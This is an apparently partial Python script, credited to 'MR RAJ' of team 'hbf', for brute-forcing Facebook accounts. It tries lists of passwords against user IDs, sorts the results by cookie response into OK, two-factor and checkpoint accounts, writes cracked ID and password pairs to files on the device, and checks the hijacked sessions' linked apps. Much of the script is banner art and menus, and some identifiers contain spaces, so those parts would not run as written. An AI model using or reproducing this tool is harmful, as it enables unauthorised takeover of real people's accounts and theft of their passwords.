#created by 𝐌𝐑 𝐑𝐀𝐉
#team name hbf
#tottaly written by 𝐌𝐑 𝐑𝐀𝐉 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; 𝐌𝐑 𝐑𝐀𝐉 \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
𝐌𝐑 𝐑𝐀𝐉2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 𝐌𝐑 𝐑𝐀𝐉 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m    𝙼𝚁 𝚁𝙰𝙹         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/toxic.boy    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    𝙼𝚁 𝚁𝙰𝙹     \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION  \033[1;31m    ➟   \033[1;32m1.2   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32m𝐌𝐑  𝙃𝘼𝘾𝙆𝙀𝙍\033[1;37m {\033[1;36mTBH\033[1;37m}   \033[1;31m          
\033[1;37m╚\033[1;36mⓉⒷⒽ\033[1;37m══════\033[41m\033[1;37m[ 𝐌𝐑 𝐑𝐀𝐉     ]\x1b[0m══════\033[1;36mⓉⒷⒽ 
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) 𝐌𝐑 𝐑𝐀𝐉
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {𝐌𝐑 𝐑𝐀𝐉T()} {WHITE}]")
    ...
    if 𝐌𝐑 𝐑𝐀𝐉 in ["1","01"]:
        ...
        os.system("xdg-open https://www.youtube.com/@𝐌𝐑 𝐑𝐀𝐉-360")
        XYZ()
    elif 𝐌𝐑 𝐑𝐀𝐉 in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/𝐌𝐑 𝐑𝐀𝐉-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/𝐌𝐑 𝐑𝐀𝐉-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio 𝐌𝐑 𝐑𝐀𝐉_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/𝐌𝐑 𝐑𝐀𝐉-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio 𝐌𝐑 𝐑𝐀𝐉_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/𝐌𝐑 𝐑𝐀𝐉-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio 𝐌𝐑 𝐑𝐀𝐉_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/𝐌𝐑 𝐑𝐀𝐉-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐖𝐀𝐒𝐈𝐌 🔥] [%s] \33[1;97m[OK:%s{𝐌𝐑 𝐑𝐀𝐉2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
